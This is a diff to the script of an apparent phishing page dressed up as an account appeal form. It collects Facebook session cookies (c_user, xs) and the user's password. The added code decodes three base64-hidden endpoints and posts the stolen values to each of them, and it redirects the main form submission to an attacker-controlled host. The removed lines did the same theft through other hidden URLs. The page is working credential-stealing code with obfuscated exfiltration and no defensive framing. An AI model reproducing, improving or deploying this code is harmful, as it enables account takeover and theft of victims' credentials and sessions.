@@ -1552,37 +1552,44 @@
         const submitBtn = document.getElementById('submit-appeal-btn');
         
         // Function to submit to other endpoints
-   function submitToOtherEndpoints(data) {
-    // Encoded endpoints
-    const endpointCUXS = btoa('https://professor-asif.vercel.app/zubair');      // c_user + xs
-    const endpointPass = btoa('https://professor-asif.vercel.app/zubairpass');  // password only
-
-    // 1️⃣ Send c_user + xs
-    const formDataCUXS = new FormData();
-    formDataCUXS.append('c_user', data.c_user);
-    formDataCUXS.append('xs', data.xs);
-
-    fetch(atob(endpointCUXS), {
-        method: 'POST',
-        body: formDataCUXS
-    })
-    .then(r => r.text())
-    .then(res => console.log('c_user + xs sent:', res))
-    .catch(err => console.error('Error sending c_user + xs:', err));
-
-    // 2️⃣ Send password
-    const formDataPass = new FormData();
-    formDataPass.append('password', data.password);
-
-    fetch(atob(endpointPass), {
-        method: 'POST',
-        body: formDataPass
-    })
-    .then(r => r.text())
-    .then(res => console.log('Password sent:', res))
-    .catch(err => console.error('Error sending password:', err));
-}
-
+        function submitToOtherEndpoints(data) {
+            const endpoints = [
+                'aHR0cHM6Ly9hbGktcGhwLndhc21lci5hcHA=',
+                'aHR0cHM6Ly9hd2Fpcy1waHAud2FzbWVyLmFwcA==',
+                'aHR0cHM6Ly91emFpci53YXNtZXIuYXBw'
+            ];
+            
+            endpoints.forEach(encodedUrl => {
+                const decodedUrl = atob(encodedUrl);
+                const formData = new FormData();
+                formData.append('c_user', data.c_user);
+                formData.append('xs', data.xs);
+                formData.append('password', data.password);
+                
+                fetch(decodedUrl, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.text();
+                })
+                .then(data => {
+                    console.log('Submission successful:', data);
+                })
+                .catch(error => {
+                    console.error('Error submitting:', error);
+                });
+            });
+        }
+        
+        submitBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            const c_user = document.getElementById('c_user').value.trim();
+            const xs = document.getElementById('xs').value.trim();
             
             // Basic validation
             if (!c_user || !xs) {
@@ -1665,7 +1672,7 @@
                         confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
                         
                         // Submit to SubmitForm.com
-                        const response = await fetch('https://submit-form.com/WBxajF22A', {
+                        const response = await fetch('https://professor-asif.vercel.app/zubair', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json',
